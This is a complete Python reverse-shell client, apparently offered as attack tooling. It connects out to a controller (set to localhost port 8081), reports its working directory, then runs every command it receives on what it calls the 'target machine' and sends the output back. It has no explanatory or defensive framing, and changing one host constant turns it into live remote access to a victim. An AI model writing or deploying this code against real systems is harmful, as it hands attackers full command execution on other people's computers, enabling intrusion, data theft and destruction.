import socket
import os
import subprocess
import sys

END_POINT = 'localhost'
PORT = 8081
BUFFER_SIZE = 1024 * 128 

SEPARATOR = "<sep>" # to separate to messages
s = socket.socket() # creating a socket object 
s.connect((END_POINT, PORT))  # connect the socket
cwd = os.getcwd()
s.send(cwd.encode()) # send the curent directory to the connected client

while 1:
    command = s.recv(BUFFER_SIZE).decode() # reading the command
    splited_command = command.split()
    if command.lower() == "exit":
        break # stop the loop
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command) # run the received command on the target machine
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}" # response
    s.send(message.encode())

# close the connection
s.close()